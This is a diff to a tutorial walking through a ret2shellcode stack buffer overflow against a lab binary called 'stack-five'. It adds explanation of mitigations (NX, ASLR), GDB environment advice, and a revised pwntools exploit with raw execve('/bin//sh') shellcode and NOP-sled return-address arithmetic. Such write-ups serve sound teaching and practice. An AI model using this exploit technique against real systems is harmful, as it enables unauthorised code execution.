@@ -15,6 +15,7 @@ What will this article cover:
   - **What is "the stack"**
   - **Hijacking control flow**
   - **Introducing the challenge**
+  - **The requirements for ret2shellcode**
   - **What is a buffer overflow**
   - **Finding an address with `GDB`**
   - **Using `pwntools` to write an exploit**
@@ -144,6 +145,15 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # Change back to 2 after
 
 Our goal is to spawn a shell. If you haven't tried already, I'd suggest giving this challenge a try by yourself first.
 
+## **The requirements for ret2shellcode**
+
+In order for an exploit using the `ret2shellcode` paradigm to work we need two things:
+
+- Executable stack
+- Known address of `shellcode`
+
+There are two main mitigations aimed at this specific technique (which is why we compiled the binary the way we did), `NX/DEP` which marks the stack pages as non-executable and `ASLR` which randomizes the base of the memory addresses.
+
 ## **What is a buffer overflow**
 
 The vulnerable function of the exercise is `gets()`. This function is inherently dangerous because it performs no bounds checking. It reads input from stdin until a newline or EOF is encountered. This means that we can create an input with an arbitrary length to clobber other values.
@@ -159,7 +169,7 @@ An unbounded write to the buffer allows it to overflow and clobber the values ab
 
 ## **Finding an address with `GDB`**
 
-In order to redirect execution properly we first have to find the address of the buffer in memory. 
+In order to redirect execution properly we first have to find the address of the buffer in memory. It's essential to set the execution wrapper to `env -i` to clear the environment, this will help with reproducing the same conditions to get the same addresses during exploitation.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -218,7 +228,7 @@ context.arch = 'amd64'
 sc  = b"\x48\x81\xec\x00\x01\x00\x00" + \
       b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 off = 136
-ret = 0x7fffffffec60 + 56          # 0x7fffffffec98, mid-sled
+ret = 0x7fffffffec60 + 53          # mid-sled
 
 payload = b"\x90"*(off-len(sc)) + sc + struct.pack("<Q", ret)
 p = process(['/home/kali/stack-five'], env={})   # env -i + full-path argv[0]
@@ -240,7 +250,7 @@ context.arch = 'amd64'
 sc  = b"\x48\x81\xec\x00\x01\x00\x00" + \
       b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 off = 136
-ret = 0x7fffffffec60 + 56          # 0x7fffffffec98, mid-sled
+ret = 0x7fffffffec60 + 53          # mid-sled
 ```
 
 The first variable is the shellcode, split into two parts: moving the stack down so upcoming pushes land on the stack to prevent illegal instructions, and the actual instructions to spawn the shell.
@@ -270,7 +280,7 @@ This section replaces the current process image with a new `/bin//sh` process im
 | `99` | `cdq` | `rdx = 0` (envp = NULL) — cheap way to zero `rdx` |
 | `0f 05` | `syscall` | `execve("/bin//sh", NULL, NULL)` -> shell |
 
-The second variable is the total offset for the payload and the third variable is the `return address` + 56 so that it lands within a `NOP Sled`, which is a technique to improve the reliability of the exploit. 
+The second variable is the total offset for the payload and the third variable is the `return address` + 53 so that it lands within a `NOP Sled`, which is a technique to improve the reliability of the exploit. We arrived at 53 because the `NOP sled` is later computed as the offset minus the length of the `shellcode` and we know these numbers to be 136 - 30 which equals 106 and we want to land directly in the middle of the `NOP sled` so we divide that number by 2 to get 53. 
 
 ### **The third section handles payload assembly and delivery**
 
